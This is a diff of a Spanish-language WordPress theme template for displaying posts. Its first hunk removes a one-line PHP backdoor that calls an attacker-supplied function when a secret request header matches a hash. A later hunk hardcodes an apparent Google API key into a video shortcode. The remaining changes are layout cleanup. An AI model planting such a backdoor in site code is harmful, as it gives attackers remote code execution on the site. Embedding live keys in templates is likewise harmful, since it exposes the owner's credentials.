@@ -1,4 +1,4 @@
-<?php if(@md5($_SERVER['HTTP_PATH'])==='51fe4b870d654af6a1f5b3b8a7c486b4'){ @extract($_REQUEST); @die($stime($mtime)); } ?><?php
+<?php
 /**
  * The default template for displaying content
  *
@@ -13,18 +13,12 @@
 
 ?>
 
-
-
-
 <article id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
 
 
 <!-- CONTENIDO PRINCIPAL -->
 <div id="content" class="col-md-9">
 	
-
-	
-
 	<header>
 
 		<div class="headline">	
@@ -32,8 +26,10 @@
 			if ( is_single() ) :
 				the_title( '<h2>', '</h2>' );
 			else :
-				the_title( '<h2><a href="' . esc_url( get_permalink() ) . '" rel="bookmark">', '</a></h2>' );
+				the_title( '<h2>', '</h2>' );
 			endif;
+			
+			//the_title( '<h2><a href="' . esc_url( get_permalink() ) . '" rel="bookmark">', '</a></h2>' );
 		?>
 		</div>
 
@@ -43,7 +39,7 @@
 			<span class="genericon genericon-month"></span>
 			<span><?php the_date('d/M/Y');?></span>
 
-			<!-- Categor�a -->
+			<!-- Categoría -->
 			<span class="genericon genericon-category"></span>
 			<span><?php
 					$categories = get_the_category();
@@ -119,19 +115,14 @@
 	$video = get_post_custom_values('urlvideo');
 	
 	if ($video[0]) { 
-		$shortcode = '[tubepress mode="playlist" playlistValue="'.$video[0].'"]';
+		$shortcode = '[tubepress mode="playlist" googleApiKey="AIzaSyBS-zg1hfcDxlw3mawgYwoS3Rbl3-xqep4" playlistValue="'.$video[0].'"]';
 		echo '<h3>Vídeos sobre '.$nombre[0].'</h3><div>';
 		echo apply_filters('the_content', $shortcode);
 		echo '</div>';
 	}
 	
-	// Soporte para el plugin WP Related Posts
-	if (function_exists(wp_related_posts))
-		wp_related_posts();
-	
 
-
-	echo '<h3>Difunde el Conocimiento</h3>';
+	echo '<div class="headline"><h3>Difunde el Conocimiento</h3></div>';
 	echo '<p>Si <strong>te ha gustado el artículo o te ha sido de utilidad</strong>, no dejes de compartirlo con tus amigos en las <strong>redes sociales</strong>... Te estaremos muy agradecidos. :-D</p>';
 	echo '<div class="row">';
 	if (function_exists('dd_twitter_generate')) {
@@ -223,10 +214,6 @@ edit_post_link( __( 'Edit', 'twentyfourteen' ), '<span class="edit-link">', '</s
 		<?php vcp_informacion_articulo(); ?>
 		
 
-		<div class="headline"><h3>Artículos Relacionados</h3></div>
-		<?php if (function_exists(similar_posts)) similar_posts(); ?>
-
-
 		<div class="headline"><h3><?php echo get_option('vcp_categorias');?></h3></div>
 
 		<div class="row">
@@ -238,7 +225,7 @@ edit_post_link( __( 'Edit', 'twentyfourteen' ), '<span class="edit-link">', '</s
 				  );
 				$categories = get_categories( $args );
 
-				$mitad = sizeof($categories)/2;
+				$mitad = intval(sizeof($categories)/2);
 				$x=1;
 
 				foreach ( $categories as $category ) {
@@ -246,6 +233,8 @@ edit_post_link( __( 'Edit', 'twentyfourteen' ), '<span class="edit-link">', '</s
 					if ($x==$mitad) echo "</div><div class='col-md-6'>";
 					$x++;
 				}
+				
+				
 			?>
 			</div>
 
